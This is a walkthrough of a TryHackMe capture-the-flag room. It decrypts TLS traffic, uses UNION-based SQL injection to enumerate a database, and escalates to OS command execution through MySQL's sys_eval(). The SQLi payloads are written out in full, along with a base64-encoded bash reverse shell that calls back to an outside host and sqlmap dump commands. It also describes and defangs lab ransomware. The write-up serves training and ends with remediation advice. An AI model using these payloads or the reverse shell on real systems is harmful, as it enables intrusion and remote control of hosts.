# TryHack3M : Sch3Ma D3Mon - TryHackMe

**Room:** [TryHack3M: Sch3Ma D3Mon (TryHackMe)](https://tryhackme.com/room/sch3mad3mon)

**Category:** Web

**Vulnerability class:** SQL Injection (CWE-89) leading to OS Command Execution via MySQL UDF (`lib_mysqludf_sys.so`) - related to OWASP A03:2021 Injection

## Scenario
A suspect running a criminal marketplace was tracked to a public library computer. Before logging in, they checked for keyloggers, so the plan instead was to capture the encrypted traffic and log the browser's TLS session keys on the side. The goal across this room was to decrypt that traffic, recover the suspect's login credentials, find an SQL injection vulnerability in their marketplace, and ride that injection all the way to OS command execution to identify and defang malware they were selling.

## Task 1: Decrypting the capture
The task files were a pcapng capture (`mayh3Mmarket.pcapng`) and a TLS key log (`ssl-key.log`), downloaded as a zip and unpacked into `~/Downloads/sch3MaD3Mon-stage1`.

The capture on its own is useless. TLS encrypts the traffic, so without the keys, Wireshark only shows scrambled "Application Data" packets. The key log file contains the secret keys used for that encryption, logged on the browser side via `chromium --ssl-key-log-file=~/ssl-key.log`. Wireshark needs both: the capture to read, and the key log to decrypt it.

I loaded the key log through the GUI: Edit > Preferences > Protocols > TLS, then set "(Pre)-Master-Secret log filename" to `ssl-key.log`. After the capture reloaded, filtering on `http` showed readable requests, confirming decryption worked.

From there I applied `http.request.method == "POST"` and found a POST to `/login.php`. Expanding the HTML Form URL Encoded section of that packet gave the credentials directly.

<img width="1568" height="478" alt="image" src="https://github.com/user-attachments/assets/b10e5688-f454-4bc6-b1b1-6a8ec17fddca" />


<img width="1568" height="736" alt="image" src="https://github.com/user-attachments/assets/1d5d0866-ad4d-4d60-a1ae-a5b5021834d5" />

**Username:** `lannister`
**Password:** `hrpTfL42wMv3`

## Task 2: Connected tables
This task was theory, covering relational databases, CRUD operations, and the basics of SQL injection (comment-based, tautology-based, and UNION-based) rather than hands-on work against the machine. No findings to log here beyond the answers themselves (RDBMS = relational database management system, CRUD = create read update delete, SQL = structured query language).

Before touching the web app, I ran an nmap scan anyway, since it's always worth doing even when the room hands you the port.

```
nmap -sCV 10.49.143.43 -Pn
```

<img width="1906" height="687" alt="Screenshot 2026-10-21 182657" src="https://github.com/user-attachments/assets/10d97e33-1923-4570-84a1-75abdcf59ad9" />

Three ports open: 22 (SSH), 3306 (MySQL), and 8000 (Apache, hosting the login page).

I tried the credentials against SSH first out of curiosity, which didn't work. Made sense, this was always going to be a web-based SQLi room, not an SSH one.

I also poked at port 3306 directly in the browser (`http://10.49.143.43:3306`), which returned garbled binary data ending in a `Got packets out of order` error.

<img width="962" height="172" alt="image" src="https://github.com/user-attachments/assets/af9aa726-3963-428e-91ee-d0c944a5663c" />

That's just the raw MySQL handshake packet, binary data a browser has no business trying to parse as HTTP, so the connection drops with an out-of-order error. Nothing exploitable there on its own, just confirmation the service was MySQL 8.0.36 as nmap had already said.

Logged in at `http://10.49.143.43:8000/login.php` with the credentials from Task 1 and landed on `searchproducts.php` as lannister.

<img width="1568" height="442" alt="image" src="https://github.com/user-attachments/assets/fb284d80-1cea-4861-ab2a-000d12f933bd" />


<img width="1568" height="488" alt="image" src="https://github.com/user-attachments/assets/201dd999-7063-4d4f-a04a-048c2f20ec3f" />

## Task 3: Unlisted
The task hinted at testing the search bar for SQL injection, so I searched `'` and got a MySQL syntax error back.

<img width="1568" height="525" alt="image" src="https://github.com/user-attachments/assets/c327eb01-6df9-4235-8f0f-b798c5d5b139" />

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```

That confirmed the input was going straight into a query unsanitized. Since this was a search field, it was almost certainly backing a `SELECT`, which meant a `UNION SELECT` was the way to pull data from other tables, provided I matched the column count.

I tested the column count with:

```
' union select 1,2,3,4,5 -- //
```

<img width="1304" height="560" alt="image" src="https://github.com/user-attachments/assets/743e2627-71b6-4c98-b57f-92ec955d56df" />

Five columns confirmed. I tried the room's suggested `union select null, null, null, column1, column2 from table_name -- //` literally and got `Table 'mayh3Mmarketplace.table_name' doesn't exist`, which was expected since `table_name` there was a placeholder, not an actual table. Confirmed the baseline worked with `' union select null,null,null,null,null -- //`, which returned an empty table with no error.

From there I pulled the database name:

```
' union select null,null,null,null,database() -- //
```

Returned `mayh3Mmarketplace`.

Then enumerated every table in that database:

```
' union select null,null,null,table_name,null from information_schema.tables WHERE table_schema='mayh3Mmarketplace' -- //
```

<img width="428" height="302" alt="Screenshot 2026-10-21 212454" src="https://github.com/user-attachments/assets/c44e74de-bebc-4994-a69f-b447692cb609" />

Tables: `easter_egg`, `leaderboard_stats`, `member_stats`, `products`, `room_stats`, `streak_stats`, `transactions`, `unlisted_products`, `users`. `unlisted_products` stood out immediately given the name.

Enumerated its columns:

```
' union select null,null,null,column_name,null from information_schema.columns where table_name='unlisted_products' -- //
```

<img width="418" height="232" alt="image" src="https://github.com/user-attachments/assets/d763d16a-f143-47f2-bf79-9d6ff32af325" />

Then dumped `product_name`:

```
' union select null,null,null,null,product_name from unlisted_products -- //
```

<img width="416" height="181" alt="image" src="https://github.com/user-attachments/assets/5f88209f-32e0-4123-a4ec-0a198e3f3c7e" />

That returned `os_sqli.php`, the hidden path the task was asking for.

**Answer:** `os_sqli.php`

Navigating to `os_sqli.php?user=lannister` loaded a page titled "OS interaction using SQL Injection" with empty Username, Name, and Description fields, setting up the next task.

<img width="405" height="91" alt="image" src="https://github.com/user-attachments/assets/ff9fff3a-4973-4a70-92e5-77975d1b1f93" />

## Task 4: From DB to OS
This task explained that the MySQL instance had `lib_mysqludf_sys.so` loaded, which exposes `sys_eval()` and `sys_exec()` as SQL functions that run arbitrary shell commands. Since the search bar's injection was already confirmed and `os_sqli.php` clearly executed something OS-level, the next step was chaining the two.

Matching the column count and position from Task 3, I ran:

```
http://10.10.211.168:8000/os_sqli.php?user=lannister' union SELECT null,null,null,null,sys_eval('pwd') -- //
```

<img width="627" height="157" alt="image" src="https://github.com/user-attachments/assets/fab4469f-e02e-4305-a40d-4ff4acba2c0b" />

The `pwd` output landed in the Description field: `/var/lib/mysql`.

**Answer:** `var/lib/mysql`

## Task 5: Finding a needle in a malwarestack
With command execution confirmed, I started looking around. The task pointed at a `/home` directory full of encrypted receipts, password-protected with what the room described as the buyer's Bitcoin sender address.

```
sys_eval('ls /home')
```

<img width="567" height="120" alt="image" src="https://github.com/user-attachments/assets/8f23f8a7-caf5-40e0-9d3a-b2a6b2c15909" />

```
sys_eval('ls /home/receipts')
```

<img width="755" height="135" alt="image" src="https://github.com/user-attachments/assets/c473ada3-64bf-4578-b129-2f82f4f7e9d1" />

Nine `.gpg` files, numbered by transaction. To get the passphrases, I needed `bcoin_sender_address` out of the `transactions` table. At this point I switched to sqlmap instead of hand-crafting more UNION payloads, since I already had the injection point captured in a request file and sqlmap handles column/type enumeration and dumping far faster than doing it manually column by column:

```
sqlmap -r req.txt -D mayh3Mmarketplace -T transactions -C transaction_number,bcoin_sender_address --dump
```

<img width="1024" height="295" alt="image" src="https://github.com/user-attachments/assets/000e1a1a-68e7-425c-b510-38db6de3208a" />

```
transaction_number | bcoin_sender_address
2999992             VqJABTN4tNF7xgGS4uBvnsmWEMtY1e5aF2
2999993             utEBtAFYFgNM5vB2naSV4xqe7m4WN1GJTs
2999994             EaNqVM2JNmW7eY1gSAt5TBuGBFt44vxFns
2999995             tu1nEFs244mJ7xSYvG5FAMNqVeTgNBtWBa
2999996             StN5NJavqY17FFWEgmneMGs2uTxAtVBB44
2999997             N5aTtgnFvMuNB4eWtG2J7qYFSEAmBxs14V
2999998             tJS45qAF1gMumGxFstTEVBWBve2YN7nNa4
2999999             MFa7N2u1Egnt4Ymse5GS4TFtBVJvBqANWx
3000000             eqFN5vBg4n2t4xGsJF7BYNWMtTaVA1muES
```

I tried reading the receipts straight through `sys_eval()`, but I couldn't get a GPG passphrase prompt through that path, there's no interactive terminal on the other end of a one-shot SQL injection, so a command expecting stdin input just hangs or fails silently. Rather than burn time forcing it through the injection, I built a reverse shell with revshells.com, base64-encoded it, and ran it through `sys_eval()`:

<img width="941" height="840" alt="image" src="https://github.com/user-attachments/assets/be5b4d9a-5d1a-4147-9845-dbe13f77480c" />

```
http://10.10.226.39:8000/os_sqli.php?debug=true&user=lannister' UNION SELECT null,null,null,null,sys_eval('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjExLjkyLjIvNDQ0NCAwPiYx | base64 -d | /bin/bash') -- //
```

That gave me an actual shell as the `mysql` user. Even with a real shell, `gpg --decrypt` still wouldn't prompt properly for the passphrase in that non-interactive context, so instead I just `cat`'d the encrypted receipt, copied the PGP block over to my Kali machine, and decrypted it there with the Bitcoin address as the passphrase.

```
cat /home/receipts/3000000.txt.gpg
```

<img width="563" height="278" alt="image" src="https://github.com/user-attachments/assets/747cb8ad-2f54-462a-b8d5-ed79743b8d2d" />

<img width="773" height="307" alt="image" src="https://github.com/user-attachments/assets/01472e7b-6533-4af1-af3c-91dca9f45b86" />


```
gpg --decrypt 3000000.txt.gpg
```

**Passphrase:** `eqFN5vBg4n2t4xGsJF7BYNWMtTaVA1muES`

```
--- Mayh3M Marketplace ---
    Invoice: 3000000
    Date: 04/02/2024 06:28:48

Transaction Number: 3000000
Sender Address: eqFN5vBg4n2t4xGsJF7BYNWMtTaVA1muES
Recipient Address: tWuNGTaSBNJq7mvxF5AetFg4B2VE41MnYs
Product: /home/products/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0
Total Amount: 865345
```

**Answer:** `/home/products/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0`

## Task 6: Operation Defang
With the malware's location in hand, the goal was to neuter it without the buyers noticing, so the trail stays live for longer.

```
ls /home/products/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0
cat readme.txt
```

Four files: `build.sh`, `config.ini`, `mmmbar.nim`, `readme.txt`. The readme itself gave the shortcut: "For testing purposes, you can skip the encryption step just by changing the 'debug' value of 'config.ini' to 'true'. The malware would still run, but it won't have any damaging effects to your machine."

**Answer (file type with the malware logic):** `nim`

Reading `mmmbar.nim`, line 59 shows the extension appended to every encrypted file:

```nim
let finalFile = file & ".boogey"
```

**Answer:** `.boogey`

The malware itself does two things when not in debug mode: it silently changes the desktop wallpaper to a ransom image pulled from an external server, then AES-256-CTR-encrypts everything under the user's Documents, Downloads, and Desktop folders, appending `.boogey` to each encrypted file. The key is just the SHA-256 hash of the hardcoded string `"myKey"`, and the IV is also hardcoded, so this isn't cryptographically sound ransomware to begin with.

Defanging it was exactly what the readme described. I edited `config.ini` to set `debug=true`:

<img width="666" height="224" alt="image" src="https://github.com/user-attachments/assets/132377d7-c1a9-41ae-8bec-83df2d19b9b1" />

Then ran the build:

```
./build.sh
```

<img width="505" height="71" alt="image" src="https://github.com/user-attachments/assets/72f16cf6-1fab-4fc0-81be-78c82e2c57a6" />

**Answer:** `THM{3FDbU2nNy2FW7yMvMoH6WTMMM}`

## Why this worked
This room chains three separate issues together rather than relying on one clever trick.

The marketplace's search field concatenated user input directly into a SQL query with no sanitization or parameterization, the textbook SQL injection setup. That alone would normally just mean data exposure. What made it worse here was that the MySQL instance had `lib_mysqludf_sys.so` loaded and enabled, which exposes `sys_eval()` and `sys_exec()` as callable SQL functions. That turned a data-only injection into full OS command execution, since anything passed to those functions runs as a shell command under the MySQL service account. Layered on top of that, the "malware" itself used a hardcoded encryption key and IV, meaning even without the debug flag, this specific sample would have been straightforward to reverse and decrypt anyway.

## How I'd fix it
Use parameterized queries or prepared statements everywhere user input touches a SQL query. String concatenation into a query is the root cause here, and it's the one fix that would have stopped everything downstream.
Never load UDFs like `lib_mysqludf_sys.so` on a production database unless there's a specific, audited reason to. Database engines executing arbitrary OS commands is an enormous blast radius for what's usually a convenience feature.
Run the database service account with the minimum privileges it needs. If `mysql` can't write outside its own data directory or invoke a shell, `sys_eval()` becomes far less dangerous even if it's still loaded.
Apply least privilege and network segmentation so the database port isn't reachable from wherever the web app's attacker-facing input lands, limiting how far a single injection point can reach.
For actual malware (not the lab kind), never hardcode encryption keys or IVs. A fixed key defeats the entire point of encrypting the victim's files in the first place.

## What I learned
This was the first room where I chained SQL injection all the way through to a reverse shell and then followed that out to decrypting file-based ransomware, rather than stopping once I had database access. The jump from "I can extract data" to "I can run arbitrary OS commands" via `sys_eval()` is the part worth remembering, since it's not SQL injection in the usual data-exfiltration sense once a UDF like that is loaded.

The other thing worth noting honestly: `gpg --decrypt` through a one-shot SQL injection or even a basic reverse shell wouldn't prompt properly for the passphrase, since there's no real interactive terminal underneath. Rather than fight that, I just moved the encrypted blob to a machine where I had a proper terminal and decrypted it there. Knowing when to stop forcing a tool through a constrained shell and just move the data somewhere easier is a habit worth keeping.

## Q&A
**Q:** What makes this different from a normal SQL injection that just leaks data?

**A:** The presence of `lib_mysqludf_sys.so` loaded into MySQL. Normally, SQL injection lets you read or manipulate data inside the database. With that UDF loaded, functions like `sys_eval()` and `sys_exec()` are callable from within a SQL query and execute arbitrary commands on the underlying OS, as whatever user the database service runs as. That converts a data-layer vulnerability into full command execution on the host.

**Q:** Why use a reverse shell instead of just running everything through `sys_eval()`?

**A:** Each `sys_eval()` call is a single, non-interactive command with no stdin attached. That works fine for one-off commands like `ls`, `pwd`, or `cat`, but it falls apart for anything expecting interactive input, like a GPG passphrase prompt. A reverse shell gives a real interactive session, though even that still wasn't enough for `gpg` to prompt cleanly in this case, so the receipt still had to be moved to a machine with a proper terminal to decrypt.

**Q:** Why was defanging the malware as simple as flipping a config flag?

**A:** Because the developers built a debug mode into it on purpose, and left the instructions for using it in a plaintext readme.txt sitting right next to the source. In a real engagement that wouldn't be handed to you, you'd be reading the `.nim` source directly to find the conditional logic guarding the damaging behavior. Here it was a deliberate shortcut for the room, but the underlying skill, reading unfamiliar source to find the kill switch, is the same either way.

**Q:** What was the actual security weakness in the malware's own encryption, separate from the debug flag?

**A:** Both the AES key and the IV were hardcoded in the source (`password: string = "myKey"`, a static 16-byte IV array). The key is derived as `sha256("myKey")`, which is identical for every single infection. That means any file encrypted by this malware could be decrypted without ever needing a ransom paid, the key is sitting in plaintext in the code that encrypted it.
